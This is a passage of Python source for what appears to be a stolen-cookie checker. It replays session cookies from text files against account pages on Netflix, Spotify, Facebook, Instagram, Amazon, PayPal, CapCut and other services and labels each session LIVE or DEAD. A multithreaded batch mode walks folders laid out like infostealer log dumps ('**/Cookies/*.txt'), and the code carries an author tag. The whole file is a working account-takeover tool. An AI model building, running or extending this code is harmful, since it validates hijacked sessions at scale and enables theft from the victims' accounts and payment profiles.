                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing YouTube cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing YouTube login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_capcut_login(cookies):

    try:
        session = requests.Session()

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.capcut.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        target_url = "https://www.capcut.com/my-edit?from_page=landing_page&start_tab=video"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)

        status_code = response.status_code
        final_url = response.url
        html_content = response.text

        if final_url == 'https://www.capcut.com' or final_url == 'https://www.capcut.com/':
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Redirected to homepage',
                'final_url': final_url,
                'status_code': status_code
            }

        import re
        plan = 'Unknown'
        pattern = r'subscribe_info["\\\s]*:["\\\s]*\{["\\\s]*flag["\\\s]*:["\\\s]*(true|false)'
        match = re.search(pattern, html_content)

        if match:
            subscribe_flag = match.group(1)
            plan = 'Pro' if subscribe_flag == 'true' else 'Free'

        if status_code == 200 and ('my-edit' in final_url or '/my-edit' in html_content):
            return {
                'status': 'success',
                'message': f'Cookie LIVE - {plan} Plan',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Plan: {plan}'
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }

    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing CapCut cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing CapCut login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_paypal_login(cookies):
    #make by @m3l0d1x
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.paypal.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.paypal.com/myaccount/profile/"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)
        
        status_code = response.status_code
        final_url = response.url
        
        if '/signin' in final_url.lower() or 'signin?returnUri' in final_url.lower():
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Redirected to signin page',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - Redirected to login'
            }
        
        if status_code == 200 and '/myaccount/profile' in final_url.lower():
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Access to profile page',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: LIVE - On profile page'
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing PayPal cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing PayPal login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

SCAN_TARGETS = {
    #make by @m3l0d1x
    "netflix": {
        "url": "https://www.netflix.com/account/membership",
        "contains": "Account",
        "domains": [".netflix.com", "netflix.com", ".netflix.net", "netflix.net"]
    },
    "spotify": {
        "url": "https://www.spotify.com/mx-en/account/subscription/manage/",
        "contains": "Account",
        "domains": [".spotify.com", "spotify.com", ".spotify.net", "spotify.net"]
    },
    "tiktok": {
        "url": "https://www.tiktok.com/setting",
        "contains": "Settings",
        "domains": [".tiktok.com", "tiktok.com", "www.tiktok.com", ".byteoversea.com", "byteoversea.com", ".musical.ly", "musical.ly", ".tiktokcdn.com", "tiktokcdn.com"]
    },
    "facebook": {
        "url": "https://www.facebook.com/settings",
        "contains": "Settings",
        "domains": [".facebook.com", "facebook.com", "www.facebook.com"]
    },
    "canva": {
        "url": "https://www.canva.com/settings/billing-and-teams",
        "contains": "billing",
        "domains": [".canva.com", ".www.canva.com", "www.canva.com", "canva.com"]
    },
    "roblox": {
        "url": "https://www.roblox.com/vi/home",
        "contains": "home",
        "domains": [".roblox.com", "roblox.com", "www.roblox.com"]
    },
    "instagram": {
        "url": "https://www.instagram.com/accounts/edit/",
        "contains": "edit",
        "domains": [".instagram.com", "instagram.com", "www.instagram.com"]
    },
    "youtube": {
        "url": "https://www.youtube.com/account",
        "contains": "account",
        "domains": [".youtube.com", "youtube.com", "www.youtube.com"]
    },
    "linkedin": {
        "url": "https://www.linkedin.com/mypreferences/d/categories/account",
        "contains": "mypreferences",
        "domains": [".linkedin.com", "linkedin.com", "www.linkedin.com", ".www.linkedin.com"]
    },
    "amazon": {
        "url": "https://www.amazon.com/gp/your-account/order-history?ref_=ya_d_c_yo",
        "contains": "order-history",
        "domains": [".amazon.com", "amazon.com", "www.amazon.com"]
    },
    "wordpress": {
        "url": "https://wordpress.com/me/",
        "contains": "me",
        "domains": [".public-api.wordpress.com", ".wordpress.com", "wordpress.com"]
    },
    "capcut": {
        "url": "https://www.capcut.com/profile",
        "contains": "profile",
        "domains": [".capcut.com", "www.capcut.com"]
    },
    "paypal": {
        "url": "https://www.paypal.com/myaccount/profile/",
        "contains": "profile",
        "domains": [".paypal.com", "www.paypal.com", "paypal.com"]
    }
}

def scan_cookies_from_file(file_path):

    try:
        file_size = os.path.getsize(file_path)
        if file_size > 10 * 1024 * 1024:
            return {
                'error': f'File too large: {file_size / (1024*1024):.1f}MB (max 10MB)'
            }
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        cookies = parse_cookies_txt(content)
        
        if not cookies:
            return {
                'error': 'No valid cookies found in file'
            }
        
        results = {}
        
        netflix_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['netflix']['domains'])
        if netflix_cookies:
            netflix_result = test_cookies_with_target(
                netflix_cookies, 
                SCAN_TARGETS['netflix']['url'], 
                SCAN_TARGETS['netflix']['contains']
            )
            netflix_result['cookie_count'] = len(netflix_cookies)
            results['netflix'] = netflix_result
        
        spotify_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['spotify']['domains'])
        if spotify_cookies:
            spotify_result = test_cookies_with_target(
                spotify_cookies, 
                SCAN_TARGETS['spotify']['url'], 
                SCAN_TARGETS['spotify']['contains']
            )
            spotify_result['cookie_count'] = len(spotify_cookies)
            results['spotify'] = spotify_result
        
        tiktok_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['tiktok']['domains'])
        if tiktok_cookies:
            tiktok_result = test_cookies_with_target(
                tiktok_cookies, 
                SCAN_TARGETS['tiktok']['url'], 
                SCAN_TARGETS['tiktok']['contains']
            )
            tiktok_result['cookie_count'] = len(tiktok_cookies)
            results['tiktok'] = tiktok_result
        
        facebook_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['facebook']['domains'])
        if facebook_cookies:
            facebook_result = test_cookies_with_target(
                facebook_cookies, 
                SCAN_TARGETS['facebook']['url'], 
                SCAN_TARGETS['facebook']['contains']
            )
            facebook_result['cookie_count'] = len(facebook_cookies)
            results['facebook'] = facebook_result
        
        canva_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['canva']['domains'])
        if canva_cookies:
            canva_result = test_cookies_with_target(
                canva_cookies, 
                SCAN_TARGETS['canva']['url'], 
                SCAN_TARGETS['canva']['contains']
            )
            canva_result['cookie_count'] = len(canva_cookies)
            results['canva'] = canva_result
        
        roblox_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['roblox']['domains'])
        if roblox_cookies:
            roblox_result = test_cookies_with_target(
                roblox_cookies, 
                SCAN_TARGETS['roblox']['url'], 
                SCAN_TARGETS['roblox']['contains']
            )
            roblox_result['cookie_count'] = len(roblox_cookies)
            results['roblox'] = roblox_result
        
        instagram_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['instagram']['domains'])
        if instagram_cookies:
            instagram_result = test_cookies_with_target(
                instagram_cookies, 
                SCAN_TARGETS['instagram']['url'], 
                SCAN_TARGETS['instagram']['contains']
            )
            instagram_result['cookie_count'] = len(instagram_cookies)
            results['instagram'] = instagram_result
        
        youtube_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['youtube']['domains'])
        if youtube_cookies:
            youtube_result = test_youtube_login(youtube_cookies)
            youtube_result['cookie_count'] = len(youtube_cookies)
            results['youtube'] = youtube_result
        
        linkedin_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['linkedin']['domains'])
        if linkedin_cookies:
            linkedin_result = test_linkedin_login(linkedin_cookies)
            linkedin_result['cookie_count'] = len(linkedin_cookies)
            results['linkedin'] = linkedin_result
        
        amazon_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['amazon']['domains'])
        if amazon_cookies:
            amazon_result = test_amazon_login(amazon_cookies)
            amazon_result['cookie_count'] = len(amazon_cookies)
            results['amazon'] = amazon_result
        
        wordpress_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['wordpress']['domains'])
        if wordpress_cookies:
            wordpress_result = test_wordpress_login(wordpress_cookies)
            wordpress_result['cookie_count'] = len(wordpress_cookies)
            results['wordpress'] = wordpress_result

        capcut_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['capcut']['domains'])
        if capcut_cookies:
            capcut_result = test_capcut_login(capcut_cookies)
            capcut_result['cookie_count'] = len(capcut_cookies)
            results['capcut'] = capcut_result

        paypal_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['paypal']['domains'])
        if paypal_cookies:
            paypal_result = test_paypal_login(paypal_cookies)
            paypal_result['cookie_count'] = len(paypal_cookies)
            results['paypal'] = paypal_result

        return results
        
    except Exception as e:
        return {
            'error': f'Error reading file: {str(e)}'
        }

def scan_cookies_from_content(content):
    
    try:
        cookies = parse_cookies_txt(content)
        
        if not cookies:
            return {
                'error': 'No valid cookies found in content'
            }
        
        results = {}
        
        netflix_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['netflix']['domains'])
        if netflix_cookies:
            netflix_result = test_cookies_with_target(
                netflix_cookies, 
                SCAN_TARGETS['netflix']['url'], 
                SCAN_TARGETS['netflix']['contains']
            )
            netflix_result['cookie_count'] = len(netflix_cookies)
            results['netflix'] = netflix_result
        
        spotify_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['spotify']['domains'])
        if spotify_cookies:
            spotify_result = test_cookies_with_target(
                spotify_cookies, 
                SCAN_TARGETS['spotify']['url'], 
                SCAN_TARGETS['spotify']['contains']
            )
            spotify_result['cookie_count'] = len(spotify_cookies)
            results['spotify'] = spotify_result
        
        tiktok_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['tiktok']['domains'])
        if tiktok_cookies:
            tiktok_result = test_cookies_with_target(
                tiktok_cookies, 
                SCAN_TARGETS['tiktok']['url'], 
                SCAN_TARGETS['tiktok']['contains']
            )
            tiktok_result['cookie_count'] = len(tiktok_cookies)
            results['tiktok'] = tiktok_result
        
        facebook_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['facebook']['domains'])
        if facebook_cookies:
            facebook_result = test_cookies_with_target(
                facebook_cookies, 
                SCAN_TARGETS['facebook']['url'], 
                SCAN_TARGETS['facebook']['contains']
            )
            facebook_result['cookie_count'] = len(facebook_cookies)
            results['facebook'] = facebook_result
        
        canva_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['canva']['domains'])
        if canva_cookies:
            canva_result = test_cookies_with_target(
                canva_cookies, 
                SCAN_TARGETS['canva']['url'], 
                SCAN_TARGETS['canva']['contains']
            )
            canva_result['cookie_count'] = len(canva_cookies)
            results['canva'] = canva_result
        
        roblox_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['roblox']['domains'])
        if roblox_cookies:
            roblox_result = test_cookies_with_target(
                roblox_cookies, 
                SCAN_TARGETS['roblox']['url'], 
                SCAN_TARGETS['roblox']['contains']
            )
            roblox_result['cookie_count'] = len(roblox_cookies)
            results['roblox'] = roblox_result
        
        instagram_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['instagram']['domains'])
        if instagram_cookies:
            instagram_result = test_cookies_with_target(
                instagram_cookies, 
                SCAN_TARGETS['instagram']['url'], 
                SCAN_TARGETS['instagram']['contains']
            )
            instagram_result['cookie_count'] = len(instagram_cookies)
            results['instagram'] = instagram_result
        
        youtube_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['youtube']['domains'])
        if youtube_cookies:
            youtube_result = test_youtube_login(youtube_cookies)
            youtube_result['cookie_count'] = len(youtube_cookies)
            results['youtube'] = youtube_result
        
        linkedin_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['linkedin']['domains'])
        if linkedin_cookies:
            linkedin_result = test_linkedin_login(linkedin_cookies)
            linkedin_result['cookie_count'] = len(linkedin_cookies)
            results['linkedin'] = linkedin_result
        
        amazon_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['amazon']['domains'])
        if amazon_cookies:
            amazon_result = test_amazon_login(amazon_cookies)
            amazon_result['cookie_count'] = len(amazon_cookies)
            results['amazon'] = amazon_result
        
        wordpress_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['wordpress']['domains'])
        if wordpress_cookies:
            wordpress_result = test_wordpress_login(wordpress_cookies)
            wordpress_result['cookie_count'] = len(wordpress_cookies)
            results['wordpress'] = wordpress_result

        capcut_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['capcut']['domains'])
        if capcut_cookies:
            capcut_result = test_capcut_login(capcut_cookies)
            capcut_result['cookie_count'] = len(capcut_cookies)
            results['capcut'] = capcut_result

        paypal_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['paypal']['domains'])
        if paypal_cookies:
            paypal_result = test_paypal_login(paypal_cookies)
            paypal_result['cookie_count'] = len(paypal_cookies)
            results['paypal'] = paypal_result

        return results

    except Exception as e:
        return {
            'error': f'Error processing content: {str(e)}'
        }

def process_single_cookie_file(file_path, folder_name, file_name):
    
    try:
        encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252']
        content = None
        
        for encoding in encodings:
            try:
                with open(file_path, 'r', encoding=encoding) as f:
                    content = f.read()
                break
            except UnicodeDecodeError:
                continue
        
        if content is None:
            return {
                'folder_name': folder_name,
                'file_name': file_name,
                'file_path': file_path,
                'error': 'Cannot read file - encoding issue'
            }
        
        cookies = parse_cookies_txt(content)
        
        if not cookies:
            return {
                'folder_name': folder_name,
                'file_name': file_name,
                'file_path': file_path,
                'error': 'No valid cookies found'
            }
        
        results = {}
        
        netflix_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['netflix']['domains'])
        if netflix_cookies:
            netflix_result = test_cookies_with_target(
                netflix_cookies, 
                SCAN_TARGETS['netflix']['url'], 
                SCAN_TARGETS['netflix']['contains']
            )
            if netflix_result and isinstance(netflix_result, dict):
                netflix_result['cookie_count'] = len(netflix_cookies)
                results['netflix'] = netflix_result
        
        spotify_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['spotify']['domains'])
        if spotify_cookies:
            spotify_result = test_cookies_with_target(
                spotify_cookies, 
                SCAN_TARGETS['spotify']['url'], 
                SCAN_TARGETS['spotify']['contains']
            )
            if spotify_result and isinstance(spotify_result, dict):
                spotify_result['cookie_count'] = len(spotify_cookies)
                results['spotify'] = spotify_result
        
        tiktok_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['tiktok']['domains'])
        if tiktok_cookies:
            tiktok_result = test_cookies_with_target(
                tiktok_cookies, 
                SCAN_TARGETS['tiktok']['url'], 
                SCAN_TARGETS['tiktok']['contains']
            )
            if tiktok_result and isinstance(tiktok_result, dict):
                tiktok_result['cookie_count'] = len(tiktok_cookies)
                results['tiktok'] = tiktok_result
        
        facebook_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['facebook']['domains'])
        if facebook_cookies:
            facebook_result = test_cookies_with_target(
                facebook_cookies, 
                SCAN_TARGETS['facebook']['url'], 
                SCAN_TARGETS['facebook']['contains']
            )
            if facebook_result and isinstance(facebook_result, dict):
                facebook_result['cookie_count'] = len(facebook_cookies)
                results['facebook'] = facebook_result
        
        canva_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['canva']['domains'])
        if canva_cookies:
            canva_result = test_cookies_with_target(
                canva_cookies, 
                SCAN_TARGETS['canva']['url'], 
                SCAN_TARGETS['canva']['contains']
            )
            if canva_result and isinstance(canva_result, dict):
                canva_result['cookie_count'] = len(canva_cookies)
                results['canva'] = canva_result
        
        roblox_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['roblox']['domains'])
        if roblox_cookies:
            roblox_result = test_cookies_with_target(
                roblox_cookies, 
                SCAN_TARGETS['roblox']['url'], 
                SCAN_TARGETS['roblox']['contains']
            )
            if roblox_result and isinstance(roblox_result, dict):
                roblox_result['cookie_count'] = len(roblox_cookies)
                results['roblox'] = roblox_result
        
        instagram_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['instagram']['domains'])
        if instagram_cookies:
            instagram_result = test_cookies_with_target(
                instagram_cookies, 
                SCAN_TARGETS['instagram']['url'], 
                SCAN_TARGETS['instagram']['contains']
            )
            if instagram_result and isinstance(instagram_result, dict):
                instagram_result['cookie_count'] = len(instagram_cookies)
                results['instagram'] = instagram_result
        
        youtube_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['youtube']['domains'])
        if youtube_cookies:
            youtube_result = test_youtube_login(youtube_cookies)
            if youtube_result and isinstance(youtube_result, dict):
                youtube_result['cookie_count'] = len(youtube_cookies)
                results['youtube'] = youtube_result
        
        linkedin_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['linkedin']['domains'])
        if linkedin_cookies:
            linkedin_result = test_linkedin_login(linkedin_cookies)
            if linkedin_result and isinstance(linkedin_result, dict):
                linkedin_result['cookie_count'] = len(linkedin_cookies)
                results['linkedin'] = linkedin_result
        
        amazon_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['amazon']['domains'])
        if amazon_cookies:
            amazon_result = test_amazon_login(amazon_cookies)
            if amazon_result and isinstance(amazon_result, dict):
                amazon_result['cookie_count'] = len(amazon_cookies)
                results['amazon'] = amazon_result
        
        wordpress_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['wordpress']['domains'])
        if wordpress_cookies:
            wordpress_result = test_wordpress_login(wordpress_cookies)
            if wordpress_result and isinstance(wordpress_result, dict):
                wordpress_result['cookie_count'] = len(wordpress_cookies)
                results['wordpress'] = wordpress_result
        
        paypal_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['paypal']['domains'])
        if paypal_cookies:
            paypal_result = test_paypal_login(paypal_cookies)
            if paypal_result and isinstance(paypal_result, dict):
                paypal_result['cookie_count'] = len(paypal_cookies)
                results['paypal'] = paypal_result
        
        
        live_count = 0
        dead_count = 0
        unknown_count = 0
        
        for service in ['netflix', 'spotify', 'tiktok', 'facebook', 'canva', 'roblox', 'instagram', 'youtube', 'linkedin', 'amazon', 'wordpress', 'capcut', 'paypal']:
            if service in results and isinstance(results[service], dict) and 'status' in results[service]:
                status = results[service]['status']
                if status == 'success':
                    live_count += 1
                elif status == 'dead':
                    dead_count += 1
                elif status == 'unknown' or status == 'no_cookies':
                    unknown_count += 1


        has_netflix_cookies = 'netflix' in results
        has_spotify_cookies = 'spotify' in results
        has_tiktok_cookies = 'tiktok' in results
        has_facebook_cookies = 'facebook' in results
        has_canva_cookies = 'canva' in results
        has_roblox_cookies = 'roblox' in results
        has_instagram_cookies = 'instagram' in results
        has_youtube_cookies = 'youtube' in results
        has_linkedin_cookies = 'linkedin' in results
        has_amazon_cookies = 'amazon' in results
        has_wordpress_cookies = 'wordpress' in results
        has_capcut_cookies = 'capcut' in results
        has_paypal_cookies = 'paypal' in results

        return {
            'folder_name': folder_name,
            'file_name': file_name,
            'file_path': file_path,
            'results': results,
            'live_count': live_count,
            'dead_count': dead_count,
            'unknown_count': unknown_count,
            'has_netflix_cookies': has_netflix_cookies,
            'has_spotify_cookies': has_spotify_cookies,
            'has_tiktok_cookies': has_tiktok_cookies,
            'has_facebook_cookies': has_facebook_cookies,
            'has_canva_cookies': has_canva_cookies,
            'has_roblox_cookies': has_roblox_cookies,
            'has_instagram_cookies': has_instagram_cookies,
            'has_youtube_cookies': has_youtube_cookies,
            'has_linkedin_cookies': has_linkedin_cookies,
            'has_amazon_cookies': has_amazon_cookies,
            'has_wordpress_cookies': has_wordpress_cookies,
            'has_capcut_cookies': has_capcut_cookies,
            'has_paypal_cookies': has_paypal_cookies
        }
        
    except Exception as e:
        return {
            'folder_name': folder_name,
            'file_name': file_name,
            'file_path': file_path,
            'error': str(e)
        }

def scan_batch_folders(folder_path, max_workers=10):
    
    if not os.path.exists(folder_path):
        return {
            'error': f'Folder not found: {folder_path}'
        }
    
    cookie_files = []
    pattern = os.path.join(folder_path, "**", "Cookies", "*.txt")
    found_files = glob.glob(pattern, recursive=True)
    
    if not found_files:
        return {
            'error': f'No cookie files found in {folder_path}/**/Cookies/*.txt'
        }
    
    total_files = len(found_files)
    print(f"{Colors.CYAN}[SCAN]{Colors.RESET} Found {total_files} cookie files to scan...", flush=True)
    print(f"{Colors.YELLOW}[THREADS]{Colors.RESET} Using {max_workers} threads for faster processing...", flush=True)
    
    all_results = []
    total_live = 0
    total_dead = 0
    total_unknown = 0
    processed_count = 0
    
    file_data = []
    for file_path in found_files:
        try:
            path_parts = file_path.replace('\\', '/').split('/')
            if len(path_parts) >= 3:
                folder_name = path_parts[-3]
            else:
                folder_name = os.path.basename(os.path.dirname(file_path))
            
            file_name = os.path.basename(file_path)
            file_data.append((file_path, folder_name, file_name))
        except Exception as e:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Error processing file path {file_path}: {str(e)}", flush=True)
            continue
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_data = {
            executor.submit(process_single_cookie_file, file_path, folder_name, file_name): (file_path, folder_name, file_name)
            for file_path, folder_name, file_name in file_data
        }
        
        for future in as_completed(future_to_data):
            file_path, folder_name, file_name = future_to_data[future]
            processed_count += 1
            
            try:
                result = future.result()
                
                if 'error' in result:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} [{processed_count}/{total_files}] {folder_name}/{file_name}: {result['error']}", flush=True)
                    continue
                
                all_results.append(result)
                
                total_live += result['live_count']
                total_dead += result['dead_count']
                total_unknown += result['unknown_count']
                
                status_icons = []
                has_netflix = result.get('has_netflix_cookies', False)
                has_spotify = result.get('has_spotify_cookies', False)
                has_tiktok = result.get('has_tiktok_cookies', False)
                has_facebook = result.get('has_facebook_cookies', False)
                has_canva = result.get('has_canva_cookies', False)
                has_roblox = result.get('has_roblox_cookies', False)
                has_instagram = result.get('has_instagram_cookies', False)
                has_youtube = result.get('has_youtube_cookies', False)
                has_linkedin = result.get('has_linkedin_cookies', False)
                has_amazon = result.get('has_amazon_cookies', False)
                has_wordpress = result.get('has_wordpress_cookies', False)
                has_capcut = result.get('has_capcut_cookies', False)
                has_paypal = result.get('has_paypal_cookies', False)

                if not has_netflix and not has_spotify and not has_tiktok and not has_facebook and not has_canva and not has_roblox and not has_instagram and not has_youtube and not has_linkedin and not has_amazon and not has_wordpress and not has_capcut and not has_paypal:
                    status_codes = []
                    if 'netflix' in result['results'] and isinstance(result['results']['netflix'], dict) and 'status_code' in result['results']['netflix']:
                        status_codes.append(f"Netflix:{result['results']['netflix']['status_code']}")
                    if 'spotify' in result['results'] and isinstance(result['results']['spotify'], dict) and 'status_code' in result['results']['spotify']:
                        status_codes.append(f"Spotify:{result['results']['spotify']['status_code']}")
                    if 'tiktok' in result['results'] and isinstance(result['results']['tiktok'], dict) and 'status_code' in result['results']['tiktok']:
                        status_codes.append(f"TikTok:{result['results']['tiktok']['status_code']}")
                    if 'facebook' in result['results'] and isinstance(result['results']['facebook'], dict) and 'status_code' in result['results']['facebook']:
                        status_codes.append(f"Facebook:{result['results']['facebook']['status_code']}")
                    if 'canva' in result['results'] and isinstance(result['results']['canva'], dict) and 'status_code' in result['results']['canva']:
                        status_codes.append(f"Canva:{result['results']['canva']['status_code']}")
                    if 'roblox' in result['results'] and isinstance(result['results']['roblox'], dict) and 'status_code' in result['results']['roblox']:
                        status_codes.append(f"Roblox:{result['results']['roblox']['status_code']}")
                    if 'instagram' in result['results'] and isinstance(result['results']['instagram'], dict) and 'status_code' in result['results']['instagram']:
                        status_codes.append(f"Instagram:{result['results']['instagram']['status_code']}")
                    if 'youtube' in result['results'] and isinstance(result['results']['youtube'], dict) and 'status_code' in result['results']['youtube']:
                        status_codes.append(f"YouTube:{result['results']['youtube']['status_code']}")
                    if 'linkedin' in result['results'] and isinstance(result['results']['linkedin'], dict) and 'status_code' in result['results']['linkedin']:
                        status_codes.append(f"LinkedIn:{result['results']['linkedin']['status_code']}")
                    if 'amazon' in result['results'] and isinstance(result['results']['amazon'], dict) and 'status_code' in result['results']['amazon']:
                        status_codes.append(f"Amazon:{result['results']['amazon']['status_code']}")
                    if 'wordpress' in result['results'] and isinstance(result['results']['wordpress'], dict) and 'status_code' in result['results']['wordpress']:
                        status_codes.append(f"WordPress:{result['results']['wordpress']['status_code']}")
                    if 'capcut' in result['results'] and isinstance(result['results']['capcut'], dict) and 'status_code' in result['results']['capcut']:
                        status_codes.append(f"CapCut:{result['results']['capcut']['status_code']}")
                    if 'paypal' in result['results'] and isinstance(result['results']['paypal'], dict) and 'status_code' in result['results']['paypal']:
                        status_codes.append(f"PayPal:{result['results']['paypal']['status_code']}")

                    status_info = f" ({', '.join(status_codes)})" if status_codes else ""
                    print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} [{processed_count}/{total_files}] {folder_name}/{file_name}: No service cookies found{status_info}", flush=True)
                else:
                    status_codes = []
                    
                    if 'netflix' in result['results'] and isinstance(result['results']['netflix'], dict) and 'status' in result['results']['netflix']:
                        netflix_status = get_status_icon(result['results']['netflix']['status'])
                        status_icons.append(f"{Colors.RED}[N]{Colors.RESET}{netflix_status}")
                        if 'status_code' in result['results']['netflix']:
                            status_codes.append(f"Netflix:{result['results']['netflix']['status_code']}")
                    elif has_netflix:
                        status_icons.append(f"{Colors.RED}[N]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'spotify' in result['results'] and isinstance(result['results']['spotify'], dict) and 'status' in result['results']['spotify']:
                        spotify_status = get_status_icon(result['results']['spotify']['status'])
                        status_icons.append(f"{Colors.GREEN}[S]{Colors.RESET}{spotify_status}")
                        if 'status_code' in result['results']['spotify']:
                            status_codes.append(f"Spotify:{result['results']['spotify']['status_code']}")
                    elif has_spotify:
                        status_icons.append(f"{Colors.GREEN}[S]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'tiktok' in result['results'] and isinstance(result['results']['tiktok'], dict) and 'status' in result['results']['tiktok']:
                        tiktok_status = get_status_icon(result['results']['tiktok']['status'])
                        status_icons.append(f"{Colors.MAGENTA}[T]{Colors.RESET}{tiktok_status}")
                        if 'status_code' in result['results']['tiktok']:
                            status_codes.append(f"TikTok:{result['results']['tiktok']['status_code']}")
                    elif result.get('has_tiktok_cookies', False):
                        status_icons.append(f"{Colors.MAGENTA}[T]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'facebook' in result['results'] and isinstance(result['results']['facebook'], dict) and 'status' in result['results']['facebook']:
                        facebook_status = get_status_icon(result['results']['facebook']['status'])
                        status_icons.append(f"{Colors.BLUE}[F]{Colors.RESET}{facebook_status}")
                        if 'status_code' in result['results']['facebook']:
                            status_codes.append(f"Facebook:{result['results']['facebook']['status_code']}")
                    elif result.get('has_facebook_cookies', False):
                        status_icons.append(f"{Colors.BLUE}[F]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'canva' in result['results'] and isinstance(result['results']['canva'], dict) and 'status' in result['results']['canva']:
                        canva_status = get_status_icon(result['results']['canva']['status'])
                        status_icons.append(f"{Colors.CYAN}[C]{Colors.RESET}{canva_status}")
                        if 'status_code' in result['results']['canva']:
                            status_codes.append(f"Canva:{result['results']['canva']['status_code']}")
                    elif result.get('has_canva_cookies', False):
                        status_icons.append(f"{Colors.CYAN}[C]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'roblox' in result['results'] and isinstance(result['results']['roblox'], dict) and 'status' in result['results']['roblox']:
                        roblox_status = get_status_icon(result['results']['roblox']['status'])
                        status_icons.append(f"{Colors.YELLOW}[R]{Colors.RESET}{roblox_status}")
                        if 'status_code' in result['results']['roblox']:
                            status_codes.append(f"Roblox:{result['results']['roblox']['status_code']}")
                    elif result.get('has_roblox_cookies', False):
